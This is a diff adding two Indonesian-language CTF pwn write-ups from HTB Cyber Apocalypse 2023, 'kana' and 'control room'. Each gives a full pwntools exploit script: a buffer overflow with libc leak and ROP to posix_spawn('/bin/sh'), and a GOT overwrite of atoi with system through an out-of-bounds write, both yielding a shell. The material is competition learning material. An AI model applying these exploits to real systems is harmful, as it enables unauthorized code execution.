@@ -929,6 +929,141 @@ print(firstCheck)
 
 untuk lebih lengkapnya bisa dilihat di writeup berikut ini: [https://sirius-a.github.io/ctf-writeups/2023/HTB-cyber-apocalypse/blockchain_the_art_of_deception/](https://sirius-a.github.io/ctf-writeups/2023/HTB-cyber-apocalypse/blockchain_the_art_of_deception/ "https://sirius-a.github.io/ctf-writeups/2023/HTB-cyber-apocalypse/blockchain_the_art_of_deception/")
 
+# kana - pwn
+
+bug bof tapi ada twist agar bisa overwrite variable setelah rip tanpa merusak rip agar dapat leak alamat libc.
+note : solve setelah selesai dengan libc lokal (2.37)
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = 'kana'
+elf = context.binary = ELF(exe, checksec=False)
+libc = ELF('/usr/lib/libc.so.6', checksec=False)
+context.log_level = 'warning'
+
+cmd = '''
+c
+'''
+
+if args.REMOTE:
+    p = remote('localhost', 8000)
+else:
+    p = process()
+
+### EXPLOIT HERE ###
+
+# gdb.attach(p, cmd)
+
+# bug : bof, read one by one in while loop break if have \n
+
+p.sendlineafter(b'>> ',b'4')
+p.sendlineafter(b'>> ',b'CCCCCCCCCCCC')
+#Overwrite the kana length to be 0xf0 instead
+p.sendlineafter(b'>> ',b'A'*92+b'\xc7'+p8(0x80)) # c7 + 1 is where the length of cccc is stored if get overwriten ccc will print out more (leak)
+p.recvline(b'\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00')
+libc.address = u64(p.recvline(0)[-8:-2].ljust(8, b'\x00')) - 0x23790
+print(hex(libc.address))
+
+pop_rbx = libc.address + 0x000000000002e211 
+pop_rcx = libc.address + 0x0000000000045a3f
+excve = libc.address + 0x49640
+
+# rop call one_gadget
+payload = flat(
+    # b'a'*92,
+    # b'\x5d\x00\x00\x00',
+    # b'b'*23,
+    b'a'*115,
+    pop_rbx,
+    0x0,
+    pop_rcx,
+    0x0,
+    excve
+)
+p.sendlineafter(b'>> ', payload)
+p.interactive()
+
+# reference solver from
+# https://github.com/Mymaqn/HTBCA2023_Pwn_Writeups/tree/master/kana
+
+# 0x49640 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+# constraints:
+#   rsp & 0xf == 0
+#   rcx == NULL
+#   rbx == NULL || (u16)[rbx] == NULL
+```
+
+referensi write up : [https://github.com/Mymaqn/HTBCA2023_Pwn_Writeups/tree/master/kana](https://github.com/Mymaqn/HTBCA2023_Pwn_Writeups/tree/master/kana "https://github.com/Mymaqn/HTBCA2023_Pwn_Writeups/tree/master/kana")
+
+# control room - PWN
+
+untuk solve yang perlu dilakukan adalah mengganti role menjadi captain ada bug dimana memset inisialisasi memori max + 1 sehingga dapat overwrite variabel role, lalu leak dengan bug UDA dengan cara gagalin scanf tetapi variable akan tetap tercopy, change role ke technician, overwrite got dengan system menggunakan bug oob yang terdapat di fungsi configure_engine, kirim sh untuk mendapatkan shell
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = 'control_room'
+elf = context.binary = ELF(exe, checksec=False)
+libc = ELF('/usr/lib/libc.so.6', checksec=False)
+context.log_level = 'warning'
+
+cmd = '''
+c
+'''
+
+if args.REMOTE:
+    p = remote('localhost', 8000)
+else:
+    p = process()
+
+### EXPLOIT HERE ###
+
+# gdb.attach(p, cmd)
+
+p.send(b'a'*256) # initialize username
+p.sendline(b'n') # edit username
+p.send(b'256')
+p.send(b'a'*256) # a bug to overwrite role to 0
+
+p.sendline(b'3')
+p.sendline(b'uy') # u is terminating the scanf, y is saving, cannot be separated
+
+p.sendline(b'4') # view our leak
+p.recvuntil(b'Latitude  : ')
+p.recvuntil(b'Latitude  : ')
+p.recvuntil(b'Latitude  : ')
+p.recvuntil(b'Latitude  : ')
+p.recvuntil(b'Latitude  : ')
+p.recvuntil(b'Longitude : ')
+leaked_libc = int(p.recvline().strip())
+libc.address = leaked_libc - (libc.symbols.atoi+20)
+print(f'libc base = {hex(libc.address)}')
+
+p.sendline(b'5') # change role to techinician
+p.sendline(b'1')
+
+p.sendline(b'1') # have bug oob, out of band
+p.recvuntil(b'Engine number [0-3]:')
+p.sendline(b'-8') # atoi got is - 8 * 0x10 from engine
+p.sendlineafter(b'Thrust:', f'{libc.symbols.system}'.encode())
+p.sendlineafter(b'Mixture ratio:', f'123'.encode()) # rubish
+p.sendline(b'y')
+
+p.sendline(b'sh') # size four so sh not /bin/sh
+p.interactive()
+
+# referece from this great writeup
+# https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/#control-room
+```
+
+penjelasan dan solver lebih lengkap diambil dari writeup : 
+https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/#control-room
+
 # Our Community Member Write Up
 
 1. Daffainfo [https://github.com/daffainfo/ctf-writeup/tree/main/Cyber Apocalypse 2023 The Cursed Mission](https://github.com/daffainfo/ctf-writeup/tree/main/Cyber%20Apocalypse%202023%20The%20Cursed%20Mission)
